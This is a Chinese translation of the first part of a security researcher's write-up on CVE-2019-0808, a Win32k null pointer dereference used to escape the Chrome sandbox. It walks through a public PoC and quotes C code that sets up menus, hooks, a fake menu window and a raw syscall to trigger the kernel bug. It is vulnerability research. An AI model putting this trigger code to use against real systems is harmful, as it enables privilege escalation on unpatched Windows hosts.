> 原文链接: https://www.anquanke.com//post/id/179234 


# Windows版“碟中谍”：如何利用Win32k漏洞实现Chrome沙盒逃逸（上）


                                阅读量   
                                **182398**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者exodusintel，文章来源：blog.exodusintel.com
                                <br>原文地址：[http://blog.exodusintel.com/2019/05/17/windows-within-windows/](http://blog.exodusintel.com/2019/05/17/windows-within-windows/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p3.ssl.qhimg.com/t011870e09d835b4b5f.gif)](https://p3.ssl.qhimg.com/t011870e09d835b4b5f.gif)



## 概述

在这篇文章中，我们将深入分析近期修复的一个Win32k漏洞（CVE-2019-0808），因为此前有很多网络犯罪分子会利用该漏洞并结合漏洞CVE-2019-5786来组成完整的Google Chrome沙盒逃逸攻击链。

漏洞CVE-2019-0808是一个空指针引用漏洞，该漏洞存在于为win32k.sys文件中，该漏洞将允许攻击者实现Chrome沙盒逃逸，并在目标系统中以SYSTEM用户权限执行任意代码，受该漏洞影响的操作系统版本有Windows 7和Windows Server 2018。



## Chrome沙盒

在开始之前，我们先简单看一看Chrome沙盒是如何工作的。不过我们还是先回顾一下什么是“沙盒”！沙盒，又叫沙箱，它是一种按照安全策略限制程序行为的执行环境，即一个虚拟系统程序。它允许用户在沙盒环境中运行浏览器或其他程序，因此运行所产生的变化可以根据用户需要来删除。它创造了一个类似沙盒的独立作业环境，在其内部运行的程序并不能对硬盘产生永久性的影响。做为一个独立的虚拟环境，很多研究人员会使用沙盒来测试不受信任的应用程序或上网行为。<br>
而Google的Chrome浏览器使用了沙盒机制来保护自身以及用户的安全，即使远程攻击者获取到了代码执行权限，他们也无法触及到目标系统的其他部分。Chrome的沙盒系统有两层沙盒，第一层沙盒可以通过改变用户ID并利用chroot来限制（非法）用户对目标设备中资源的访问，第二层沙盒会尝试使用seccomp过滤器来限制攻击者针对内核的攻击行为，以阻止沙盒进程中出现不需要使用到的系统调用。一般情况下来说，这种机制是非常有效的，因为大多数Linux内核漏洞都需要涉及到系统调用，而seccomp过滤器的作用就体现出来了。但是，seccomp过滤器也不是所有系统调用都可以屏蔽或者过滤的，因此这也给很多想法“新颖”的攻击者提供了可乘之机。也就是说，攻击者仍然可以想办法通过攻击目标系统内核来实现Chrome沙盒逃逸。

[![](https://p3.ssl.qhimg.com/t01034f93aee3c1c4d8.png)](https://p3.ssl.qhimg.com/t01034f93aee3c1c4d8.png)



## PoC分析

漏洞利用PoC（由ze0r提供）：[https://github.com/ze0r/cve-2019-0808-poc/](https://github.com/ze0r/cve-2019-0808-poc/)

首先，我们一起分析一下这份PoC代码。PoC代码首先要做的就是创建两个无模式拖放弹出菜单，即hMenuRoot和hMenuSub。hMenuRoot会被设置为主下拉菜单，并将hMenuSub设置为其子菜单。

<code>HMENU hMenuRoot = CreatePopupMenu();<br>
HMENU hMenuSub = CreatePopupMenu();<br>
...<br>
MENUINFO mi = `{` 0 `}`;<br>
mi.cbSize = sizeof(MENUINFO);<br>
mi.fMask = MIM_STYLE;<br>
mi.dwStyle = MNS_MODELESS | MNS_DRAGDROP;<br>
SetMenuInfo(hMenuRoot, &amp;mi);<br>
SetMenuInfo(hMenuSub, &amp;mi);<br>
AppendMenuA(hMenuRoot, MF_BYPOSITION | MF_POPUP, (UINT_PTR)hMenuSub, "Root");<br>
AppendMenuA(hMenuSub, MF_BYPOSITION | MF_POPUP, 0, "Sub");</code>

接下来，代码会使用SetWindowsHookEx()来在当前线程中设置一个钩子，即WH_CALLWNDPROC。这个钩子可以确保WindowHookProc()在一个窗口进程运行前执行。完成后，代码会调用SetWinEventHook()来设置一个事件钩子，并确保在弹出菜单显示出来时调用DisplayEventProc()。

<code>SetWindowsHookEx(WH_CALLWNDPROC, (HOOKPROC)WindowHookProc, hInst, GetCurrentThreadId());<br>
SetWinEventHook(EVENT_SYSTEM_MENUPOPUPSTART, EVENT_SYSTEM_MENUPOPUPSTART,hInst,DisplayEventProc,GetCurrentProcessId(),GetCurrentThreadId(),0);</code>

下图显示的是设置WH_CALLWNDPROC钩子之前和之后的Windows消息调用流程：

[![](https://p4.ssl.qhimg.com/t017a74486ef2439d86.jpg)](https://p4.ssl.qhimg.com/t017a74486ef2439d86.jpg)

钩子设置完后，代码会使用CreateWindowA()和类字符串“#32768”来创建hWndFakeMenu窗口。以这种方式创建窗口会导致CreateWindowA()在窗口对象中设置多个值为0或NULL的数据域，因为CreateWindowA()并不知道如何去填充这些数据。其中，跟漏洞利用有关的重要数据域为spMenu域，它也会被设置为NULL。

`hWndFakeMenu = CreateWindowA("#32768", "MN", WS_DISABLED, 0, 0, 1, 1, nullptr, nullptr, hInst, nullptr);`

接下来，代码会使用CreateWindowA()和窗口类wndClass来创建hWndMain。这将会给hWndMain的窗口进程设置DefWindowProc()，而这个函数是一个Windows API，主要负责处理窗口无法处理的那些窗口消息。

CreateWindowA()的参数还可以确保hWndMain在“禁用模式”下被创建，并且不会从终端用户那里接收任何的键盘或鼠标输入，但是仍然可以从其他窗口、系统或应用程序来接收窗口消息，这样可以防止用户与窗口进行意外交互。CreateWindowA()的最后一个参数可以确保窗口位置固定在(0x1, 0x1)，具体如下列代码所示：



```
WNDCLASSEXA wndClass = `{` 0 `}`;
wndClass.cbSize = sizeof(WNDCLASSEXA);
wndClass.lpfnWndProc = DefWindowProc;
wndClass.cbClsExtra = 0;
wndClass.cbWndExtra = 0;
wndClass.hInstance = hInst;
wndClass.lpszMenuName = 0;
wndClass.lpszClassName = “WNDCLASSMAIN”;
RegisterClassExA(&amp;wndClass);
hWndMain = CreateWindowA(“WNDCLASSMAIN”, “CVE”, WS_DISABLED, 0, 0, 1, 1, nullptr, nullptr, hInst, nullptr);
TrackPopupMenuEx(hMenuRoot, 0, 0, 0, hWndMain, NULL);

MSG msg = `{` 0 `}`;
while (GetMessageW(&amp;msg, NULL, 0, 0))
`{`
TranslateMessage(&amp;msg);
DispatchMessageW(&amp;msg);
if (iMenuCreated &gt;= 1) `{`
bOnDraging = TRUE;
callNtUserMNDragOverSysCall(&amp;pt, buf);
break;
`}`
`}`
```

hWndMain窗口创建完成后，代码会调用TrackPopupMenuEx()来显示hMenuRoot，目的是为了将窗口消息存储至hWndMain的消息栈中，而main()函数的消息循环可以通过GetMessageW()和TranslateMessage()来直接获取消息栈中的信息，并执行窗口进程钩子，然后调用WindowHookProc()：BOOL bOnDraging = FALSE;

```
….
LRESULT CALLBACK WindowHookProc(INT code, WPARAM wParam, LPARAM lParam)
`{`
tagCWPSTRUCT cwp = (tagCWPSTRUCT )lParam;
if (!bOnDraging) `{`
return CallNextHookEx(0, code, wParam, lParam);
`}`
….
```

由于变量bOnDraging目前还未设置，WindowHookProc()函数将会直接调用CallNextHookEx()来获取下一个可用的钩子。这将触发一次EVENT_SYSTEM_MENUPOPUPSTART事件，而事件钩子可以捕捉到这个事件，并传递给DisplayEventProc()。UINT iMenuCreated = 0;



```
VOID CALLBACK DisplayEventProc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD idEventThread, DWORD dwmsEventTime)
`{`
switch (iMenuCreated)
`{`
case 0:
SendMessageW(hwnd, WM_LBUTTONDOWN, 0, 0x00050005);
break;
case 1:
SendMessageW(hwnd, WM_MOUSEMOVE, 0, 0x00060006);
break;
`}`
printf(“[] MSGn”);
iMenuCreated++;
`}`
```

由于这是DisplayEventProc()第一次执行，iMenuCreated的值为0，因此代码中的“case 0”将会执行，并通过SendMessageW()将WM_LMOUSEBUTTON窗口消息发送给hWndMain来选择hMenuRoot菜单项(0x5, 0x5)。消息显示在hWndMain的窗口消息队列中之后，iMenuCreated会自增。

hWndMain接下来会处理WM_LMOUSEBUTTON消息，并选择hMenu，最终显示hMenuSub子菜单。接下来会触发第二个EVENT_SYSTEM_MENUPOPUPSTART事件，并再次执行DisplayEventProc()。这一次，iMenuCreated的值变成了1，此时代码会使用SendMessageW()来让鼠标光标移动到桌面的(0x6, 0x6)位置。由于此时的鼠标左键仍处于已点击的状态，所以这样就完成了之前提到的“拖拽”行为。接下来，iMenuCreated又会自增，并在main()中的消息循环中执行下列代码：

```
CHAR buf[0x100] = `{` 0 `}`;
POINT pt;
pt.x = 2;
pt.y = 2;
…
if (iMenuCreated &gt;= 1) `{`
bOnDraging = TRUE;
callNtUserMNDragOverSysCall(&amp;pt, buf);
break;
`}`
```

此时iMenuCreated的值已经变成了2，if语句中的代码将会被执行，并将bOnDraging设置为TRUE，表明拖拽操作已由鼠标完成，然后用POINT结构体pt来调用callNtUserMNDragOverSysCall()。

callNtUserMNDragOverSysCall()是win32k.sys中一个针对系统调用函数NtUserMNDragOver()的封装函数，在Windows 7和Windows 7 SP1中NtUserMNDragOver()的系统调用号为0x11ED。在PoC中，使用了系统调用来从user32.dll中获取NtUserMNDragOver()的地址（因为不同操作系统版本的系统调用号不同），每当user32.dll更新，user32.dll中的导出函数和NtUserMNDragOver()函数都会改变。

```
void callNtUserMNDragOverSysCall(LPVOID address1, LPVOID address2) `{`
_asm `{`
mov eax, 0x11ED
push address2
push address1
mov edx, esp
int 0x2E
pop eax
pop eax
`}`
`}`
```

接下来，NtUserMNDragOver()会调用xxxMNFindWindowFromPoint()，并执行xxxSendMessage()来发送一个类型为WM_MN_FINDMENUWINDOWFROMPOINT的用户模式回调。用户模式回调的返回值会使用HMValidateHandle()来检测。

```
LONG_PTR __stdcall xxxMNFindWindowFromPoint(tagPOPUPMENU pPopupMenu, UINT pIndex, POINTS screenPt)
`{`
….
v6 = xxxSendMessage(
var_pPopupMenu-&gt;spwndNextPopup,
MN_FINDMENUWINDOWFROMPOINT,
(WPARAM)&amp;pPopupMenu,
(unsigned __int16)screenPt.x | ((unsigned int )&amp;screenPt &gt;&gt; 16 &lt;&lt; 16)); // Make the
// MN_FINDMENUWINDOWFROMPOINT usermode callback
// using the address of pPopupMenu as the
// wParam argument.
ThreadUnlock1();
if ( IsMFMWFPWindow(v6) ) // Validate the handle returned from the user
// mode callback is a handle to a MFMWFP window.
v6 = (LONG_PTR)HMValidateHandleNoSecure((HANDLE)v6, TYPE_WINDOW); // Validate that the returned
// handle is a handle to
// a window object. Set v1 to
// TRUE if all is good.
…
```

回调执行后，窗口钩子函数WindowHookProc()将会执行。这个函数会判断当前接收到的窗口消息类型，如果收到的窗口消息为WM_MN_FINDMENUWINDOWFROMPOINT消息，那么下列代码将会执行：

```
if ((cwp-&gt;message == WM_MN_FINDMENUWINDOWFROMPOINT))
`{`
bIsDefWndProc = FALSE;
printf(“[] HWND: %p n”, cwp-&gt;hwnd);
SetWindowLongPtr(cwp-&gt;hwnd, GWLP_WNDPROC, (ULONG64)SubMenuProc);
`}`
return CallNextHookEx(0, code, wParam, lParam);
```

这段代码将会修改hWndMain的窗口处理进程，从原来的DefWindowProc()修改为SubMenuProc()。它还会将bIsDefWndProc设置为FALSE，表明hWndMain的窗口处理进程已不再是DefWindowProc()了。

钩子设置好之后，hWndMain的窗口进程将会执行。但是，由于hWndMain的窗口进程修改为了SubMenuProc()，因此执行的将是SubMenuProc()函数，而非原来的DefWindowProc()。

SubMenuProc()首先会检测接收到的消息类型是否为WM_MN_FINDMENUWINDOWFROMPOINT。如果是，SubMenuProc()会调用SetWindowLongPtr()来将hWndMain的窗口进程重新设置为DefWindowProc()，这样hWndMain就可以处理其他额外传入的窗口消息了，也可以防止应用程序无法响应。接下来，SubMenuProc()将会返回hWndFakeMenu，或处理那些使用菜单类字符串创建的窗口。

```
LRESULT WINAPI SubMenuProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
`{`
if (msg == WM_MN_FINDMENUWINDOWFROMPOINT)
`{`
SetWindowLongPtr(hwnd, GWLP_WNDPROC, (ULONG)DefWindowProc);
return (ULONG)hWndFakeMenu;
`}`
return DefWindowProc(hwnd, msg, wParam, lParam);
`}`
```

由于hWndFakeMenu是一个有效窗口，在对其进行处理时将会调用HMValidateHandle()检测，但很多窗口元素都被设置成了0或NULL，因为CreateWindowEx()会尝试使用无效信息来创建菜单窗口。代码接下来会运行xxxMNFindWindowFromPoint()和xxxMNUpdateDraggingInfo()，调用MNGetpItem()，然后调用MNGetpItemFromIndex()。

接下来，MNGetpItemFromIndex()会尝试访问hWndFakeMenu的spMenu域。但是hWndFakeMenu的spMenu值为NULL，这样就导致了一个空指针引用，如果NULL页面无法正常分配，就会发生内核崩溃。

```
tagITEM __stdcall MNGetpItemFromIndex(tagMENU spMenu, UINT pPopupMenu)
`{`
tagITEM result; // eax
if ( pPopupMenu == -1 || pPopupMenu &gt;= spMenu-&gt;cItems )`{` // NULL pointer dereference will occur
// here if spMenu is NULL.
result = 0;
else
result = (tagITEM )spMenu-&gt;rgItems + 0x6C * pPopupMenu;
return result;
`}`
```



## 总结

在这篇文章中，我们详细分析了针对漏洞CVE-2019-0808的漏洞利用PoC代码。文中给出了PoC代码的获取地址，并对其中的关键代码段进行了详细分析，以及漏洞利用关键点，那么在《Windows版“碟中谍”：如何利用Win32k漏洞实现Chrome沙盒逃逸（下）》中，我们将跟大家详细介绍如何利用这个Chrome沙盒漏洞，并详细介绍漏洞利用过程中的每一个步骤，敬请关注安全客。
